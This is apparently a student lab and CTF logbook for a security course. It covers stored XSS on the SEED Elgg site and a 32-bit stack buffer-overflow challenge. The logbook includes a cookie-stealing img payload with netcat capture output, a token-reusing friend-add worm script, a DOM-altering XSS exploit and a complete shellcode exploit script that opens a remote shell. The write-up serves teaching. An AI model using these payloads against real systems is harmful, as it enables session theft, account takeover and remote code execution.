# Week 10 Logbook

### Preparation Steps

- Add the following entries to `/etc/hosts`:
    ```
    10.9.0.5 www.seed-server.com
    10.9.0.5 www.example32a.com
    10.9.0.5 www.example32b.com
    10.9.0.5 www.example32c.com
    10.9.0.5 www.example60.com
    10.9.0.5 www.example70.com
    ```

## Task 1

- Login to `www.seed-server.com` with username `alice` and password `seedalice`, for example.
- Edit profile to contain Javascript in the brief description field.

![](https://i.imgur.com/fT4pgOr.png)

- When viewing the profile, an alert appears.

![](https://i.imgur.com/wgmFTC8.png)

## Task 2

![](https://i.imgur.com/eeFTqiA.png)

- When viewing the profile, the cookies for the website are shown.

![](https://i.imgur.com/VHjR0Vm.png)

## Task 3

- We insert an `<img>` tag whose `src` attribute is a server that we control. The browser will send a `GET` request with the cookies of the user that is visiting the profile.

![](https://i.imgur.com/qgaaUXT.png)

- We receive the user's cookies in the GET request, as shown by the output of `nc`.

```bash
01/11/22]seed@VM:~$ nc -lknv 5555
Listening on 0.0.0.0 5555
Connection received on 10.0.2.4 34980
GET /?c=Elgg%3Dm5i7uf00kv2s7ki9nf8sqigt30%3B%20elggperm%3Dzti_o1m_-Yfi1Ur8Fa642UXnzELvp9ce HTTP/1.1
Host: 10.9.0.1:5555
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: image/avif,image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://www.seed-server.com/
```

## Task 4

- Alice has no friends yet.
![](https://i.imgur.com/ExLpubo.png)
- Login as `boby` with the password `seedboby`.
- Add `samy` as a friend normally sends the following request:
    ```
    http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1641922817&__elgg_token=FIp1aPq5bx91NGMRNVuHmg&__elgg_ts=1641922817&__elgg_token=FIp1aPq5bx91NGMRNVuHmg
    Host: www.seed-server.com
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    X-Requested-With: XMLHttpRequest
    Connection: keep-alive
    Referer: http://www.seed-server.com/profile/samy
    Cookie: Elgg=nui97q6vko3d1nbt39brl5bace

    GET: HTTP/1.1 200 OK
    Date: Tue, 11 Jan 2022 17:40:22 GMT
    Server: Apache/2.4.41 (Ubuntu)
    Cache-Control: must-revalidate, no-cache, no-store, private
    expires: Thu, 19 Nov 1981 08:52:00 GMT
    pragma: no-cache
    x-content-type-options: nosniff
    Vary: User-Agent
    Content-Length: 386
    Keep-Alive: timeout=5, max=89
    Connection: Keep-Alive
    Content-Type: application/json; charset=UTF-8
    ```
    - The base url for the send friend request action is `www.seed-server.com/action/friends/add`
    - To add `samy` as a friend, the request needs to have the `friend` parameter set to `59`
- Login as `samy` with the password `seedsamy`.
- Edit Samy's profile and insert the following Javascript code in the About Me field (editor mode):
```javascript
<script type="text/javascript">
    window.onload = function () {
        var Ajax=null;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        // Construct the HTTP request to add Samy as a friend.
        var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + token;
        // Create and send Ajax request to add friend
        Ajax=new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.send();
    }
</script>
```
- Visit Samy's profile as Alice, the following request is sent:
```
http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1641923707&__elgg_token=FB8-JiZqRisFNk_HV2P1Yg
Host: www.seed-server.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://www.seed-server.com/profile/samy
Cookie: Elgg=7p39f9jt9i6vorjrnpgb8gq8g7

GET: HTTP/1.1 302 Found
Date: Tue, 11 Jan 2022 17:55:07 GMT
Server: Apache/2.4.41 (Ubuntu)
Cache-Control: must-revalidate, no-cache, no-store, private
expires: Thu, 19 Nov 1981 08:52:00 GMT
pragma: no-cache
Location: http://www.seed-server.com/profile/samy
Vary: User-Agent
Content-Length: 402
Keep-Alive: timeout=5, max=76
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```
- Alice is now Samy's friend

![](https://i.imgur.com/uWTUxR3.png)

## CTF - Task 1

### Tasks

- Explore the platform as a regular user, make a request and wait for it to be seen by an administrator.
    - After submitting a request for the flag, we are redirected to a page with two disabled buttons (*Give the flag* and *Mark request as read*), each of them being submit buttons for a separate form.
    - The *Give the flag* form has an empty action.
    - The *Mark request as read* form has the following action: 
    ```/request/{request_id}/mark_as_read```
- Check if there is any vulnerability in the justification input form. Identify it and explain how it can be used to obtain the flag.
    - The justification form has a XSS (Cross-Site Scripting) vulnerability, meaning that we can inject malicious Javascript code in the justification field that will run when the contents of the field are displayed (we just need to wrap our Javascript code with `<script>` tags).

- Create an exploit that explores this vulnerability and makes the administrator accept your request.
    - We know that the administrator never gives the flag away (they always click the *Mark request as read* button). Therefore, if we can change the behaviour of this button, we will be able to acquire the flag.
    - The Javascript snippet below finds the form corresponding to the *Mark request as read* button and edits the DOM, changing the form action to the action of the *Give flag* form (which is an empty string).
    ```javascript
    let form = document.getElementById('markAsRead').parentElement.parentElement;
    form.action = '';
    ```


## CTF - Task 2

- Run `checksec` on the provided binary. What protections exist? Which attacks can be executed?
    ```
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
    ```
    - The only protection the executable has is PIE (Position Independent Executable). It has no stack canary nor `W^X` protection, therefore we can perform a buffer overflow attack.
- Which line has a vulnerability?
    - The vulnerability is present in line 12: `gets(buffer)`. This line calls the `gets` function of the `stdio` library, which reads characters from `stdin` into a buffer until it reads a newline or `EOF`.
- What can be done with this vulnerability?
    - Since `gets` has no way to specify a maximum number of characters to read and `buffer` has size 100 bytes, we can perform a buffer overflow and inject shellcode. The program also prints the address of the buffer with every execution, so we can parse this information and then use it to calculate the return address for our exploit.
- Create an exploit that allows you to obtain a shell in the server and get the flag present in the program's working directory.
    - We created and executed the exploit script below (which is based on a previous buffer overflow exploit). This script opens a connection to the server, parses the received message to obtain the buffer address, calculates the return address and creates a payload with shellcode that gives us a remote shell.
    - After obtaining a shell, we executed `cat flag.txt`.

### `exploit.py`
```python
#!/usr/bin/python3
import sys, socket
from pwn import remote, process

# 32bit shellcode
shellcode = (
  '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f'
  '\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31'
  '\xd2\x31\xc0\xb0\x0b\xcd\x80'
).encode('latin-1')

def netcat(hostname, port):
    r = remote(hostname, port)
    # r = process('./program')

    data = r.recv(1024).decode('utf-8')

    # Get second line
    l = data.split('\n')[1]

    # Get buffer address as an integer
    index = l.index('0x')
    addr = int(l[index:index+10], 16)

    # Return Address = Buffer Address + Buffer Size + Frame Pointer Size + Offset
    ret = addr + 100 + 4 + 50

    # Fill the payload with NOP's
    payload = bytearray(0x90 for i in range(400)) 

    # Place shellcode at the very end of the payload
    start = 400 - len(shellcode)
    payload[start:start + len(shellcode)] = shellcode

    # Buffer size is 100 bytes
    # +4 (probably because of alignment)
    # +4 because return address comes after the frame pointer ($ebp)
    offset = 100 + 4 + 4

    L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
    payload[offset:offset + L] = (ret).to_bytes(L, byteorder='little')

    r.send(payload)
    r.interactive()

hostname = 'ctf-fsi.fe.up.pt'
port = 4001

netcat(hostname, port)
```
